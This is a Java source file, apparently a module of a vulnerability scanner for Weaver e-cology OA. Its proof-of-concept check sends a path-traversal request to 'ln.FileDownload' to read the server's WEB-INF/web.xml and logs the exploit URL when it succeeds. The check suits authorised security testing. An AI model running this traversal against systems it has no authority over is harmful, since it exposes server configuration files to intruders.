package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;

import java.net.MalformedURLException;

@BasicMapping(uri ="泛微")
public class WeaverController  extends Controller implements BasicController{
    public static String[] SupportVul; //初始化支持的漏洞
    public static String name = "泛微";
    public WeaverController(){

    }
    @VulnerabilityDescriptionMapping(Description="ln.FileDownload" ,SupportVulType= com.achuna33.SupportType.SupportVul.信息泄露)
    public void vul_ln_FileDownload(Poc_Exp type, String target, Object... args) throws MalformedURLException {

        Cache.uiController.logTextArea.appendText("\n开始检测：  vul_ExcelExport");

        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml");
                String data = "";
                Response result = httpRequest.Get(data);
                if(result.statusCode==200 && result.responseBody.contains("pattern")){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n 访问地址："+target+"/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml" );
                }else {
                    WriteLog("\n 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }





}
